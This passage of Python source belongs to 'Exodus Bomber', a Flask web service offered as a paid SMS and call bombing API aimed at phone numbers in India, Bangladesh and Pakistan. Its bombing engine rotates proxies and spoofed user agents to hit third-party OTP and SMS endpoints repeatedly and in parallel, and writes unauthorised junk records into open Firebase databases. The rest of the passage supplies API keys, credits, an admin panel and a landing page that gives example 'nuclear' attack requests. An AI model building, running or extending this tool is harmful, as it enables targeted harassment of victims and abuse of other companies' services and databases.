    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/117.0.5938.108 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
]

# ═══════════════════════════════════════════════════════════════
#  PROXY UTILITIES
# ═══════════════════════════════════════════════════════════════
_proxies: list = []
_proxy_idx = 0
_proxy_lock = threading.Lock()

def _parse_proxy_lines(lines: list) -> list:
    result = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split(":")
        if len(parts) == 4:
            ip, port, user, pw = parts
            proxy_url = f"http://{user}:{pw}@{ip}:{port}"
        else:
            proxy_url = f"http://{line}"
        result.append({"http": proxy_url, "https": proxy_url})
    return result

def load_proxies():
    global _proxies
    if not USE_PROXY:
        return

    # Option 1: PROXY_LIST env var — paste proxies as newline or comma separated
    # Useful on render.com where you can't upload files via env var
    proxy_env = os.environ.get("PROXY_LIST", "").strip()
    if proxy_env:
        lines = re.split(r'[\n,;]+', proxy_env)
        _proxies = _parse_proxy_lines(lines)
        print(f"✅ Loaded {len(_proxies)} proxies from PROXY_LIST env var")
        return

    # Option 2: Proxies.txt file
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            lines = f.readlines()
        _proxies = _parse_proxy_lines(lines)
        print(f"✅ Loaded {len(_proxies)} proxies from {PROXY_FILE}")
        return

    print("⚠️  No proxies loaded — running without proxy rotation")

def get_proxy():
    global _proxy_idx
    if not USE_PROXY or not _proxies:
        return None
    with _proxy_lock:
        p = _proxies[_proxy_idx % len(_proxies)]
        _proxy_idx += 1
        return p

def _ua():
    return random.choice(USER_AGENTS)

# ═══════════════════════════════════════════════════════════════
#  FIREBASE FIRESTORE HELPERS (dual-write to SQLite too)
# ═══════════════════════════════════════════════════════════════
def fb_get_user(uid):
    if not _db: return None
    try:
        doc = _db.collection("users").document(str(uid)).get()
        return doc.to_dict() if doc.exists else None
    except: return None

def fb_set_user(uid, data):
    if not _db: return False
    try:
        _db.collection("users").document(str(uid)).set(data, merge=True)
        return True
    except: return False

def fb_update_user(uid, **kwargs):
    if not _db: return False
    try:
        _db.collection("users").document(str(uid)).update(kwargs)
        return True
    except: return False

def fb_all_users(limit=500):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("users").limit(limit).stream()]
    except: return []

def fb_get_key_by_key(key):
    if not _db: return None
    try:
        doc = _db.collection("keys").document(key).get()
        return doc.to_dict() if doc.exists else None
    except: return None

def fb_get_key_by_user(uid):
    if not _db: return None
    try:
        docs = _db.collection("keys").where("user_id", "==", str(uid)) \
            .where("revoked", "==", False) \
            .order_by("expires_at", direction=firestore.Query.DESCENDING).limit(1).stream()
        for d in docs:
            return d.to_dict()
        return None
    except: return None

def fb_set_key(key, data):
    if not _db: return False
    try:
        _db.collection("keys").document(key).set(data)
        return True
    except: return False

def fb_update_key(key, **kwargs):
    if not _db: return False
    try:
        _db.collection("keys").document(key).update(kwargs)
        return True
    except: return False

def fb_all_keys(limit=200):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("keys")
                .order_by("created_at", direction=firestore.Query.DESCENDING).limit(limit).stream()]
    except: return []

def fb_all_channels():
    if not _db: return []
    try:
        return [dict(d.to_dict(), id=d.id) for d in _db.collection("channels").stream()]
    except: return []

def fb_add_channel(chat_id, title, link):
    if not _db: return False
    try:
        _db.collection("channels").document(str(chat_id)).set({
            "chat_id": str(chat_id), "title": title, "link": link,
            "added_at": int(time.time())
        })
        sq_upsert_channel(chat_id, title, link)
        return True
    except: return False

def fb_del_channel(chat_id):
    if not _db: return False
    try:
        _db.collection("channels").document(str(chat_id)).delete()
        sq_del_channel(chat_id)
        return True
    except: return False

def fb_get_setting(k, default=None):
    if not _db: return default
    try:
        doc = _db.collection("settings").document(k).get()
        return doc.to_dict().get("v") if doc.exists else default
    except: return default

def fb_set_setting(k, v):
    if not _db: return False
    try:
        _db.collection("settings").document(k).set({"v": str(v)})
        sq_set_setting(k, v)
        return True
    except: return False

def fb_all_gifts(limit=100):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("gift_codes")
                .order_by("created_at", direction=firestore.Query.DESCENDING).limit(limit).stream()]
    except: return []

def fb_set_gift(code, data):
    if not _db: return False
    try:
        _db.collection("gift_codes").document(code).set(data)
        return True
    except: return False

def fb_del_gift(code):
    if not _db: return False
    try:
        _db.collection("gift_codes").document(code).delete()
        return True
    except: return False

def fb_usage_today(key):
    if not _db: return sq_usage_today(key)
    try:
        today = time.strftime("%Y-%m-%d", time.gmtime())
        doc = _db.collection("usage").document(f"{key}_{today}").get()
        return doc.to_dict().get("count", 0) if doc.exists else 0
    except: return 0

def fb_incr_usage(key):
    sq_count = sq_incr_usage(key)
    if not _db: return sq_count
    try:
        today = time.strftime("%Y-%m-%d", time.gmtime())
        ref = _db.collection("usage").document(f"{key}_{today}")
        ref.set({"key": key, "day": today, "count": firestore.Increment(1)}, merge=True)
        doc = ref.get()
        return doc.to_dict().get("count", 1) if doc.exists else 1
    except: return sq_count

def daily_limit():
    try: return int(fb_get_setting("daily_limit", API_DAILY_LIMIT))
    except: return API_DAILY_LIMIT

def validate_key(key):
    if not key: return False, 401, "API key required"
    row = fb_get_key_by_key(key)
    if not row: row = sq_get_key(key)
    if not row: return False, 401, "Invalid API key"
    if row.get("revoked"): return False, 403, "Key revoked"
    if row.get("expires_at", 0) <= int(time.time()): return False, 401, "Key expired"
    u = fb_get_user(row.get("user_id", ""))
    if not u: u = sq_get_user(row.get("user_id", ""))
    if u and u.get("banned"): return False, 403, "Account banned"
    limit = row.get("daily_limit") or daily_limit()
    count = fb_incr_usage(key)
    if count > limit: return False, 429, f"Daily limit reached ({limit}/day)"
    return True, 200, "ok"

# ═══════════════════════════════════════════════════════════════
#  BOMBING ENGINE
# ═══════════════════════════════════════════════════════════════
def _call_api(api: dict, number: str) -> bool:
    """Single call to one API endpoint with one proxy."""
    try:
        proxy  = get_proxy()
        hdrs   = dict(api.get("headers") or {})
        hdrs.setdefault("User-Agent", _ua())
        method = (api.get("method") or "POST").upper()

        if "url_fn" in api and callable(api["url_fn"]):
            url = api["url_fn"](number)
        else:
            url = api.get("url", "")

        if method == "GET":
            r = requests.get(url, headers=hdrs, proxies=proxy, timeout=8, verify=False)
        else:
            raw_data = api.get("data")
            body = raw_data(number) if callable(raw_data) else (raw_data or "")
            r = requests.post(url, data=body, headers=hdrs, proxies=proxy, timeout=8, verify=False)

        return r.status_code in (200, 201, 202, 204)
    except:
        return False


def _bomb_apis(apis: list, number: str, limit: int = 0, workers: int = 20) -> tuple:
    """
    Fire each API in the list PROXY_MULTIPLIER times across different proxies.
    total_calls = len(selected) × PROXY_MULTIPLIER
    Returns (success_count, total_calls).
    """
    if not apis:
        return 0, 0
    selected = apis[:limit] if limit > 0 else apis
    n = PROXY_MULTIPLIER
    success = 0
    total_calls = len(selected) * n

    with ThreadPoolExecutor(max_workers=min(workers * n, 100)) as pool:
        futures = []
        for api in selected:
            for _ in range(n):
                futures.append(pool.submit(_call_api, api, number))
        for f in as_completed(futures):
            try:
                if f.result(): success += 1
            except:
                pass
    return success, total_calls


def _bomb_firebase_rtdb(db_urls: list, number: str, limit: int = 0) -> int:
    """Write to India Firebase RTDBs for extra coverage."""
    targets = db_urls[:limit] if limit > 0 else db_urls
    success = 0

    def _write(db_url):
        rand_id = secrets.token_hex(8)
        paths = [
            f"{db_url}/users/{rand_id}/phone.json",
            f"{db_url}/otp/{rand_id}.json",
            f"{db_url}/leads/{rand_id}.json",
        ]
        payload = json.dumps({
            "phone": number, "mobile": number,
            "phoneNumber": number, "timestamp": int(time.time()),
        })
        hdrs = {"Content-Type": "application/json", "User-Agent": _ua()}
        for path in paths:
            try:
                r = requests.put(path, data=payload, headers=hdrs, timeout=6, verify=False)
                if r.status_code in (200, 201):
                    return True
            except:
                pass
        return False

    with ThreadPoolExecutor(max_workers=min(16, len(targets))) as pool:
        futures = [pool.submit(_write, url) for url in targets]
        for f in as_completed(futures):
            try:
                if f.result(): success += 1
            except:
                pass
    return success


def _bomb_custom_india(number: str, count: int = 10) -> tuple:
    names = ["Rahul", "Priya", "Amit", "Sneha", "Vijay", "Pooja", "Suresh", "Neha",
             "Deepak", "Anjali", "Ravi", "Kavita", "Arun", "Sunita", "Manoj"]
    msgs  = ["ExodusVerify", "BombTest", "OTPTest", "ExodusAPI", "VerifyNow",
             "TestMsg", "Register", "SignUp", "ExodusBot", "BomberTest"]

    # Also multiply by PROXY_MULTIPLIER
    total = count * PROXY_MULTIPLIER

    def _fire(_):
        name = random.choice(names)
        msg  = random.choice(msgs)
        try:
            result = custom_sms_india(number, name, msg)
            return bool(result and result.get("status") is not False)
        except:
            return False

    with ThreadPoolExecutor(max_workers=min(total, 20)) as pool:
        results = list(pool.map(_fire, range(total)))
    return sum(1 for r in results if r), total


# ─── India bomb modes ───────────────────────────────────────────
def bomb_india(number: str, mode: str) -> dict:
    """
    mode: sms | custom | nuclear
    All modes benefit from PROXY_MULTIPLIER × repetition.
    """
    sms_ok = sms_total = fb_ok = fb_total = custom_ok = custom_total = 0

    if mode in ("sms", "nuclear"):
        sms_ok, sms_total = _bomb_apis(INDIA_SMS_APIS, number, limit=0)

    if mode == "custom":
        custom_ok, custom_total = _bomb_custom_india(number, count=15)

    if mode == "nuclear":
        fb_ok    = _bomb_firebase_rtdb(INDIA_FIREBASE_DBS, number, limit=0)
        fb_total = len(INDIA_FIREBASE_DBS)
        c_ok, c_total = _bomb_custom_india(number, count=20)
        custom_ok   += c_ok
        custom_total += c_total

    return {
        "country":        "india",
        "mode":           mode,
        "number":         number,
        "sms_sent":       sms_ok,
        "sms_total":      sms_total,
        "custom_sent":    custom_ok,
        "custom_total":   custom_total,
        "firebase_sent":  fb_ok,
        "firebase_total": fb_total,
        "total_sent":     sms_ok + fb_ok + custom_ok,
        "sent":           sms_ok + fb_ok + custom_ok,
        "total_apis":     sms_total + fb_total + custom_total,
        "multiplier":     PROXY_MULTIPLIER,
    }


# ─── Bangladesh bomb modes ──────────────────────────────────────
def bomb_bangladesh(number: str, mode: str) -> dict:
    """
    Single BD API endpoint with type=sms|call|both.
    limit = credits_cost (credits spent = bombs per proxy call).
    Total hits = limit × PROXY_MULTIPLIER.
    """
    limit_map = {
        "sms":     CREDITS_SMS_BOMB,
        "call":    CREDITS_CALL_BOMB,
        "mixed":   CREDITS_MIXED_BOMB_BD,
        "nuclear": CREDITS_NUCLEAR_BD,
    }
    limit = limit_map.get(mode, CREDITS_SMS_BOMB)

    sms_ok = sms_total = call_ok = call_total = 0

    if mode == "sms":
        sms_ok, sms_total = _bd_fire(number, "sms", limit)

    elif mode == "call":
        call_ok, call_total = _bd_fire(number, "call", limit)

    elif mode == "mixed":
        # Both SMS and Call separately
        sms_ok, sms_total   = _bd_fire(number, "sms", limit)
        call_ok, call_total = _bd_fire(number, "call", limit)

    elif mode == "nuclear":
        # "both" type hits SMS+Call together in one request
        both_ok, both_total = _bd_fire(number, "both", limit)
        sms_ok    = both_ok
        sms_total = both_total
        # Also fire sms and call separately for maximum coverage
        s_ok, s_total = _bd_fire(number, "sms", limit)
        c_ok, c_total = _bd_fire(number, "call", limit)
        sms_ok    += s_ok
        sms_total += s_total
        call_ok   += c_ok
        call_total += c_total

    total = sms_ok + call_ok
    return {
        "country":    "bangladesh",
        "mode":       mode,
        "number":     number,
        "bd_phone":   _normalize_bd_phone(number),
        "limit":      limit,
        "sms_sent":   sms_ok,
        "sms_total":  sms_total,
        "call_sent":  call_ok,
        "call_total": call_total,
        "total_sent": total or sms_ok,
        "sent":       total or sms_ok,
        "total_apis": sms_total + call_total,
        "multiplier": PROXY_MULTIPLIER,
    }


def bomb_pakistan(number: str) -> dict:
    ok, total = _bomb_apis(PAK_SMS_APIS, number, limit=0)
    return {
        "country":   "pakistan",
        "mode":      "sms",
        "number":    number,
        "sms_sent":  ok,
        "sms_total": total,
        "total_sent": ok,
        "sent":      ok,
        "total_apis": total,
        "multiplier": PROXY_MULTIPLIER,
    }


# ═══════════════════════════════════════════════════════════════
#  FLASK APP
# ═══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = SECRET_KEY
app.json.sort_keys = False
admin_tokens: set = set()


def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        token = request.headers.get("X-Admin-Token") or flask_session.get("admin_token")
        if not token or token not in admin_tokens:
            if request.path.startswith("/admin/api/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect("/admin/login")
        return f(*a, **kw)
    return wrapper


def _get_key():
    if not REQUIRE_API_KEY:
        return True, 200, "ok"
    key = (request.headers.get("X-API-Key")
           or request.args.get("key")
           or (request.get_json(silent=True) or {}).get("key", ""))
    return validate_key(key.strip())


def _get_number():
    return (request.args.get("number")
            or (request.get_json(silent=True) or {}).get("number", "")).strip()


# ═══════════════════════════════════════════════════════════════
#  BOMB ENDPOINTS
# ═══════════════════════════════════════════════════════════════
@app.route("/ind", methods=["GET", "POST"])
def api_ind():
    ok, code, msg = _get_key()
    if not ok:
        return jsonify({"status": False, "message": msg}), code
    number = _get_number()
    if not number or len(number) < 10:
        return jsonify({"status": False, "message": "Invalid number"}), 400
    mode = (request.args.get("mode") or request.args.get("type") or "sms").lower()
    tier_map = {"normal": "sms", "premium": "custom", "nuclear": "nuclear"}
    mode = tier_map.get(mode, mode)
    if mode not in ("sms", "custom", "nuclear"):
        mode = "sms"
    result = bomb_india(number, mode)
    return jsonify({"status": True, **result})


@app.route("/bd", methods=["GET", "POST"])
def api_bd():
    ok, code, msg = _get_key()
    if not ok:
        return jsonify({"status": False, "message": msg}), code
    number = _get_number()
    if not number or len(number) < 9:
        return jsonify({"status": False, "message": "Invalid number"}), 400
    mode = (request.args.get("mode") or request.args.get("type") or "sms").lower()
    tier_map = {"normal": "sms", "premium": "mixed", "nuclear": "nuclear"}
    mode = tier_map.get(mode, mode)
    if mode not in ("sms", "call", "mixed", "nuclear"):
        mode = "sms"
    result = bomb_bangladesh(number, mode)
    return jsonify({"status": True, **result})


@app.route("/pak", methods=["GET", "POST"])
def api_pak():
    ok, code, msg = _get_key()
    if not ok:
        return jsonify({"status": False, "message": msg}), code
    number = _get_number()
    if not number or len(number) < 10:
        return jsonify({"status": False, "message": "Invalid number"}), 400
    result = bomb_pakistan(number)
    return jsonify({"status": True, **result})


@app.route("/status")
def status():
    users = fb_all_users(5000) or sq_all_users(5000)
    bombs = sum(u.get("total_bombs", 0) for u in users)
    return jsonify({
        "status": True,
        "developer": DEVELOPER,
        "users": len(users),
        "bombs": bombs,
        "india_sms_apis": len(INDIA_SMS_APIS),
        "india_firebase_dbs": len(INDIA_FIREBASE_DBS),
        "bd_api": "single-url (sms|call|both)",
        "pak_sms_apis": len(PAK_SMS_APIS),
        "proxy_multiplier": PROXY_MULTIPLIER,
    })


@app.route("/")
def home():
    h = HOME_HTML.replace("{{BOT_USERNAME}}", BOT_USERNAME)
    h = h.replace("{{DEVELOPER_URL}}", DEVELOPER_URL)
    h = h.replace("{{DEVELOPER}}", DEVELOPER)
    h = h.replace("{{PROXY_MULTIPLIER}}", str(PROXY_MULTIPLIER))
    return render_template_string(h)


# ═══════════════════════════════════════════════════════════════
#  ADMIN ROUTES
# ═══════════════════════════════════════════════════════════════
@app.route("/admin")
@app.route("/admin/")
def admin_index():
    return render_template_string(ADMIN_HTML)

@app.route("/admin/login")
def admin_login_page():
    return render_template_string(ADMIN_HTML)

@app.route("/admin/api/login", methods=["POST"])
def admin_login():
    d = request.get_json(silent=True) or {}
    if d.get("password") != ADMIN_PASSWORD:
        return jsonify({"error": "Invalid password"}), 401
    token = secrets.token_hex(32)
    admin_tokens.add(token)
    threading.Timer(86400, lambda: admin_tokens.discard(token)).start()
    return jsonify({"token": token})

@app.route("/admin/api/stats")
@require_auth
def admin_stats():
    users = fb_all_users(5000) or sq_all_users(5000)
    keys  = fb_all_keys(5000)
    now   = int(time.time())
    return jsonify({
        "users": len(users),
        "banned": sum(1 for u in users if u.get("banned")),
        "keys": sum(1 for k in keys if k.get("expires_at", 0) > now and not k.get("revoked")),
        "bombs": sum(u.get("total_bombs", 0) for u in users),
        "channels": len(fb_all_channels()),
        "india_sms_apis": len(INDIA_SMS_APIS),
        "india_firebase_dbs": len(INDIA_FIREBASE_DBS),
        "bd_api": "exodus-bd (sms|call|both)",
        "pak_sms_apis": len(PAK_SMS_APIS),
        "premium": sum(1 for u in users if u.get("is_premium")),
        "total_credits": sum(u.get("credits", 0) for u in users),
        "proxy_multiplier": PROXY_MULTIPLIER,
    })

@app.route("/admin/api/users")
@require_auth
def admin_users():
    users = fb_all_users(500) or sq_all_users(500)
    return jsonify(users)

@app.route("/admin/api/users/<uid>/ban", methods=["POST"])
@require_auth
def admin_ban(uid):
    fb_update_user(uid, banned=True)
    sq_update_user(uid, banned=1)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/unban", methods=["POST"])
@require_auth
def admin_unban(uid):
    fb_update_user(uid, banned=False)
    sq_update_user(uid, banned=0)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/credits", methods=["POST"])
@require_auth
def admin_credits(uid):
    d   = request.get_json(silent=True) or {}
    amt = int(d.get("amount", 0))
    if _db:
        _db.collection("users").document(str(uid)).set(
            {"credits": firestore.Increment(amt)}, merge=True)
    sq_incr_user(uid, "credits", amt)
    return jsonify({"success": True, "added": amt})

@app.route("/admin/api/users/<uid>/premium", methods=["POST"])
@require_auth
def admin_premium(uid):
    d = request.get_json(silent=True) or {}
    val = bool(d.get("premium", True))
    fb_update_user(uid, is_premium=val)
    sq_update_user(uid, is_premium=1 if val else 0)
    return jsonify({"success": True})

@app.route("/admin/api/channels")
@require_auth
def admin_channels():
    return jsonify(fb_all_channels() or sq_all_channels())

@app.route("/admin/api/channels", methods=["POST"])
@require_auth
def admin_add_channel():
    d = request.get_json(silent=True) or {}
    chat_id = d.get("chat_id", "").strip()
    title   = d.get("title", "").strip()
    link    = d.get("link", "").strip()
    if not chat_id:
        return jsonify({"error": "chat_id required"}), 400
    fb_add_channel(chat_id, title, link)
    return jsonify({"success": True})

@app.route("/admin/api/channels/<chat_id>", methods=["DELETE"])
@require_auth
def admin_del_channel(chat_id):
    fb_del_channel(chat_id)
    return jsonify({"success": True})

@app.route("/admin/api/keys")
@require_auth
def admin_keys():
    return jsonify(fb_all_keys(100))

@app.route("/admin/api/keys", methods=["POST"])
@require_auth
def admin_gen_key():
    d    = request.get_json(silent=True) or {}
    uid  = str(d.get("user_id", ""))
    days = int(d.get("days", 30))
    u = fb_get_user(uid)
    if not u: u = sq_get_user(uid)
    if not u:
        return jsonify({"error": "User not found"}), 404
    key = f"EXO-{secrets.token_hex(12).upper()}"
    exp = int(time.time()) + days * 86400
    kdata = {
        "key": key, "user_id": uid,
        "created_at": int(time.time()),
        "expires_at": exp, "revoked": False,
        "daily_limit": daily_limit(), "plan": f"Admin {days}d",
    }
    fb_set_key(key, kdata)
    sq_upsert_key(key, {**kdata, "revoked": 0})
    return jsonify({"success": True, "key": key, "expires_at": exp})

@app.route("/admin/api/keys/<key>", methods=["DELETE"])
@require_auth
def admin_revoke_key(key):
    fb_update_key(key, revoked=True)
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute("UPDATE api_keys SET revoked=1 WHERE key=?", (key,))
            conn.commit()
        finally: conn.close()
    return jsonify({"success": True})

@app.route("/admin/api/gift")
@require_auth
def admin_gift_list():
    return jsonify(fb_all_gifts(100))

@app.route("/admin/api/gift", methods=["POST"])
@require_auth
def admin_gift_create():
    d          = request.get_json(silent=True) or {}
    credits    = int(d.get("credits", 0))
    max_users  = int(d.get("max_users", 0))
    days_valid = int(d.get("days_valid", 7))
    is_premium = bool(d.get("is_premium", False))
    if credits <= 0:
        return jsonify({"error": "credits must be > 0"}), 400
    code = "EXO-GIFT-" + secrets.token_hex(4).upper()
    exp  = int(time.time()) + days_valid * 86400 if days_valid > 0 else 0
    gdata = {
        "code": code, "credits": credits, "max_users": max_users,
        "claimed_count": 0, "expires_at": exp,
        "created_at": int(time.time()), "is_premium": is_premium,
    }
    fb_set_gift(code, gdata)
    return jsonify({"success": True, "code": code, "credits": credits,
                    "max_users": max_users, "expires_at": exp})

@app.route("/admin/api/gift/<code>", methods=["DELETE"])
@require_auth
def admin_gift_delete(code):
    fb_del_gift(code)
    return jsonify({"success": True})

@app.route("/admin/api/export")
@require_auth
def admin_export():
    users = fb_all_users(5000) or sq_all_users(5000)
    return jsonify({
        "users": users,
        "keys": fb_all_keys(5000),
        "gifts": fb_all_gifts(5000),
        "channels": fb_all_channels() or sq_all_channels(),
        "exported_at": datetime.now(timezone.utc).isoformat(),
    })

@app.route("/admin/api/import", methods=["POST"])
@require_auth
def admin_import():
    d = request.get_json(silent=True) or {}
    users = d.get("users", [])
    if users:
        sq_import_users(users)
        for u in users:
            if "id" in u:
                fb_set_user(u["id"], u)
    return jsonify({"success": True, "imported": len(users)})

@app.route("/admin/api/settings")
@require_auth
def admin_settings_get():
    return jsonify({"daily_limit": daily_limit(), "proxy_multiplier": PROXY_MULTIPLIER})

@app.route("/admin/api/settings", methods=["POST"])
@require_auth
def admin_settings_set():
    d = request.get_json(silent=True) or {}
    if "daily_limit" in d:
        fb_set_setting("daily_limit", int(d["daily_limit"]))
    return jsonify({"success": True})

# ═══════════════════════════════════════════════════════════════
#  HTML TEMPLATES
# ═══════════════════════════════════════════════════════════════
HOME_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Exodus Bomber — SMS Bombing API</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#030712;color:#e2e8f0;min-height:100vh;overflow-x:hidden}
.wrap{max-width:900px;margin:0 auto;padding:2rem 1rem 4rem}
.hero{text-align:center;padding:3rem 1rem 2rem}
.hero-icon{width:80px;height:80px;margin:0 auto 1.5rem;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border-radius:1.25rem;display:flex;align-items:center;justify-content:center;font-size:2.5rem;box-shadow:0 0 40px rgba(139,92,246,.3)}
.hero-title{font-size:clamp(2rem,6vw,3.5rem);font-weight:900;background:linear-gradient(90deg,#8b5cf6,#06b6d4,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:1rem}
.hero-sub{color:#64748b;font-family:'JetBrains Mono',monospace;font-size:.85rem;letter-spacing:.12em;text-transform:uppercase;margin:0 auto 2rem}
.btns{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:.5rem;padding:.9rem 2rem;border-radius:.75rem;font-weight:700;font-size:.9rem;text-decoration:none;transition:all .2s;border:none;cursor:pointer}
.btn-p{background:linear-gradient(135deg,#8b5cf6,#06b6d4);color:#fff;box-shadow:0 0 25px rgba(139,92,246,.4)}
.btn-p:hover{opacity:.9;transform:translateY(-2px)}
.btn-o{background:transparent;border:1px solid rgba(255,255,255,.15);color:#e2e8f0}
.btn-o:hover{background:rgba(255,255,255,.05)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;margin:3rem 0}
.stat{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:1rem;padding:1.25rem;text-align:center}
.stat-v{font-size:1.75rem;font-weight:900;color:#06b6d4;font-family:'JetBrains Mono',monospace}
.stat-l{font-size:.7rem;color:#64748b;text-transform:uppercase;letter-spacing:.1em;margin-top:.25rem}
.card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:1rem;padding:1.5rem;margin-bottom:1rem}
.card h3{font-size:1rem;font-weight:800;margin-bottom:.75rem;color:#8b5cf6}
.card p{color:#94a3b8;font-size:.85rem;line-height:1.7}
.card code{background:#0f172a;border:1px solid rgba(255,255,255,.1);padding:.15rem .4rem;border-radius:.3rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:#22d3ee}
.footer{text-align:center;margin-top:3rem;padding-top:2rem;border-top:1px solid rgba(255,255,255,.07);color:#64748b;font-size:.8rem}
.footer a{color:#8b5cf6;text-decoration:none}
.badge{background:rgba(139,92,246,.2);color:#a78bfa;padding:.2rem .5rem;border-radius:.3rem;font-size:.7rem;font-weight:700}
</style>
</head>
<body>
<div class="wrap">
  <div class="hero">
    <div class="hero-icon">💣</div>
    <h1 class="hero-title">Exodus Bomber</h1>
    <p class="hero-sub">India · Bangladesh · Pakistan SMS Bombing API</p>
    <p style="color:#64748b;font-size:.8rem;margin-bottom:1.5rem">
      <span class="badge">{{PROXY_MULTIPLIER}}× Proxy Multiplier</span>
      &nbsp;Every API fired {{PROXY_MULTIPLIER}} times across proxies
    </p>
    <div class="btns">
      <a class="btn btn-p" href="https://t.me/{{BOT_USERNAME}}">🤖 Open Bot</a>
      <a class="btn btn-o" href="/admin">🛡️ Admin Panel</a>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="stat-v" id="s-users">—</div><div class="stat-l">Users</div></div>
    <div class="stat"><div class="stat-v" id="s-bombs">—</div><div class="stat-l">Bombs Sent</div></div>
    <div class="stat"><div class="stat-v" id="s-ind">—</div><div class="stat-l">India APIs</div></div>
    <div class="stat"><div class="stat-v" id="s-bd">—</div><div class="stat-l">BD API</div></div>
    <div class="stat"><div class="stat-v" id="s-pak">—</div><div class="stat-l">PAK APIs</div></div>
  </div>
  <div class="card">
    <h3>🇮🇳 India — SMS / Custom / Nuclear</h3>
    <p><code>GET /ind?key=KEY&number=91XXXXXXXXXX&mode=sms</code><br>
       <code>GET /ind?key=KEY&number=91XXXXXXXXXX&mode=custom</code><br>
       <code>GET /ind?key=KEY&number=91XXXXXXXXXX&mode=nuclear</code></p>
  </div>
  <div class="card">
    <h3>🇧🇩 Bangladesh — SMS / Call / Mixed / Nuclear</h3>
    <p><code>GET /bd?key=KEY&number=880XXXXXXXXX&mode=sms</code><br>
       <code>GET /bd?key=KEY&number=880XXXXXXXXX&mode=call</code><br>
       <code>GET /bd?key=KEY&number=880XXXXXXXXX&mode=mixed</code><br>
       <code>GET /bd?key=KEY&number=880XXXXXXXXX&mode=nuclear</code></p>
  </div>
  <div class="card">
    <h3>🇵🇰 Pakistan — SMS only</h3>
    <p><code>GET /pak?key=KEY&number=92XXXXXXXXXX</code></p>
  </div>
  <div class="footer">
    <p>Powered by <a href="{{DEVELOPER_URL}}">{{DEVELOPER}}</a></p>
  </div>
</div>
<script>
async function load(){try{const d=await (await fetch('/status')).json();
document.getElementById('s-users').textContent=d.users||0;
document.getElementById('s-bombs').textContent=d.bombs||0;
document.getElementById('s-ind').textContent=(d.india_sms_apis||0)+(d.india_firebase_dbs||0);
document.getElementById('s-bd').textContent='✅';
document.getElementById('s-pak').textContent=d.pak_sms_apis||0;}catch(e){}}
load();setInterval(load,10000);
</script>
</body></html>"""

ADMIN_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Exodus Bomber — Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#030712;color:#e2e8f0;min-height:100vh}
.wrap{max-width:1100px;margin:0 auto;padding:2rem 1rem}
h1{font-size:1.5rem;font-weight:900;color:#8b5cf6;margin-bottom:2rem}
.login-box{max-width:420px;margin:5rem auto;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.1);border-radius:1rem;padding:2.5rem}
.login-box h2{margin-bottom:1.5rem;color:#8b5cf6;font-size:1.25rem}
.inp{width:100%;padding:.8rem 1rem;background:#0f172a;border:1px solid rgba(255,255,255,.1);border-radius:.6rem;color:#e2e8f0;font-size:.9rem;margin-bottom:1rem;outline:none}
.inp:focus{border-color:#8b5cf6}
.btn{padding:.8rem 2rem;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border:none;border-radius:.6rem;color:#fff;font-weight:700;cursor:pointer;width:100%;font-size:.95rem}
.stat-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:1rem;margin-bottom:2rem}
.stat{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:.85rem;padding:1.25rem;text-align:center}
.stat-v{font-size:1.5rem;font-weight:900;color:#06b6d4;font-family:'JetBrains Mono',monospace}
.stat-l{font-size:.65rem;color:#64748b;text-transform:uppercase;letter-spacing:.1em;margin-top:.25rem}
.section{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:1rem;padding:1.5rem;margin-bottom:1.5rem}
.section h3{color:#8b5cf6;margin-bottom:1rem;font-size:1rem}
table{width:100%;border-collapse:collapse;font-size:.8rem}
